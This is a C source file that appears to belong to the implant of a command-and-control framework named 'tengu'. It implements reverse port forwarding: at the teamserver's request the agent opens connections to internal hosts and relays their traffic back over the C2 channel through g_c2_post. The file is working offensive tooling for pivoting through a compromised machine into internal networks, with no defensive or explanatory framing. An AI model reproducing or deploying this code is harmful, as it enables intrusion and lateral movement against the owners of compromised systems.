#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netdb.h>
#include <fcntl.h>

#include "tengu.h"

#define MAX_RPORTFWD_CONNS 16
#define RPORTFWD_BUF       65536

typedef struct {
    uint32_t id;
    int      fd;
} RpfConn;

static RpfConn g_rpf[MAX_RPORTFWD_CONNS];

void rportfwd_init(void) {
    for (int i = 0; i < MAX_RPORTFWD_CONNS; i++)
        g_rpf[i].fd = -1;
}

static RpfConn* rpf_find(uint32_t id) {
    for (int i = 0; i < MAX_RPORTFWD_CONNS; i++)
        if (g_rpf[i].fd >= 0 && g_rpf[i].id == id)
            return &g_rpf[i];
    return NULL;
}

static RpfConn* rpf_alloc(uint32_t id) {
    for (int i = 0; i < MAX_RPORTFWD_CONNS; i++) {
        if (g_rpf[i].fd < 0) {
            g_rpf[i].id = id;
            return &g_rpf[i];
        }
    }
    return NULL;
}

static void rpf_free(RpfConn* c) {
    if (c->fd >= 0) { close(c->fd); c->fd = -1; }
}

static void rpf_send_frame(uint32_t cmd, uint32_t conn_id,
                            const uint8_t* data, size_t dlen) {
    uint32_t payload_size = 4 + (uint32_t)dlen;

    Buf* body = buf_new();
    buf_push_u32be(body, cmd);
    buf_push_u32be(body, 0);
    buf_push_u32be(body, payload_size);
    buf_push_u32le(body, conn_id);
    if (data && dlen > 0)
        buf_push_bytes(body, data, dlen);

    Buf* pkt = buf_new();
    buf_push_u32be(pkt, 12 + (uint32_t)body->size);
    buf_push_u32be(pkt, TENGU_MAGIC_VALUE);
    buf_push_u32be(pkt, g_agent_id);
    buf_push_bytes(pkt, body->data, body->size);
    buf_free(body);

    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

// Teamserver asks agent to connect to an internal target.
void rportfwd_open(uint32_t conn_id, const char* host, uint16_t port) {
    struct addrinfo hints = {0};
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%u", (unsigned)port);

    struct addrinfo* res = NULL;
    if (getaddrinfo(host, port_str, &hints, &res) != 0 || !res) {
        rpf_send_frame(TENGU_RPORTFWD_CLOSE, conn_id, NULL, 0);
        return;
    }

    int fd = socket(res->ai_family, SOCK_STREAM, 0);
    if (fd < 0) { freeaddrinfo(res); rpf_send_frame(TENGU_RPORTFWD_CLOSE, conn_id, NULL, 0); return; }

    if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) {
        close(fd);
        freeaddrinfo(res);
        rpf_send_frame(TENGU_RPORTFWD_CLOSE, conn_id, NULL, 0);
        return;
    }
    freeaddrinfo(res);

    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);

    RpfConn* conn = rpf_alloc(conn_id);
    if (!conn) {
        close(fd);
        rpf_send_frame(TENGU_RPORTFWD_CLOSE, conn_id, NULL, 0);
        return;
    }
    conn->fd = fd;

    // Signal success with empty DATA frame.
    rpf_send_frame(TENGU_RPORTFWD_DATA, conn_id, NULL, 0);
}

// Relay data from external client (via teamserver) to the internal target.
void rportfwd_send_data(uint32_t conn_id, const uint8_t* data, size_t dlen) {
    RpfConn* conn = rpf_find(conn_id);
    if (!conn || dlen == 0) return;

    size_t total = 0;
    while (total < dlen) {
        ssize_t n = write(conn->fd, data + total, dlen - total);
        if (n <= 0) {
            rpf_send_frame(TENGU_RPORTFWD_CLOSE, conn_id, NULL, 0);
            rpf_free(conn);
            return;
        }
        total += (size_t)n;
    }
}

void rportfwd_close(uint32_t conn_id) {
    RpfConn* conn = rpf_find(conn_id);
    if (conn) rpf_free(conn);
}

// Poll all active rportfwd sockets and forward data to the teamserver.
void rportfwd_collect_data(void) {
    static uint8_t buf[RPORTFWD_BUF];

    fd_set rfds;
    FD_ZERO(&rfds);
    int maxfd = -1;

    for (int i = 0; i < MAX_RPORTFWD_CONNS; i++) {
        if (g_rpf[i].fd >= 0) {
            FD_SET(g_rpf[i].fd, &rfds);
            if (g_rpf[i].fd > maxfd) maxfd = g_rpf[i].fd;
        }
    }
    if (maxfd < 0) return;

    struct timeval tv = {0, 0};
    if (select(maxfd + 1, &rfds, NULL, NULL, &tv) <= 0) return;

    for (int i = 0; i < MAX_RPORTFWD_CONNS; i++) {
        if (g_rpf[i].fd < 0 || !FD_ISSET(g_rpf[i].fd, &rfds)) continue;

        ssize_t n = read(g_rpf[i].fd, buf, sizeof(buf));
        if (n > 0) {
            rpf_send_frame(TENGU_RPORTFWD_DATA, g_rpf[i].id, buf, (size_t)n);
        } else if (n == 0 || (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK)) {
            rpf_send_frame(TENGU_RPORTFWD_CLOSE, g_rpf[i].id, NULL, 0);
            rpf_free(&g_rpf[i]);
        }
    }
}

int rportfwd_active(void) {
    for (int i = 0; i < MAX_RPORTFWD_CONNS; i++)
        if (g_rpf[i].fd >= 0) return 1;
    return 0;
}
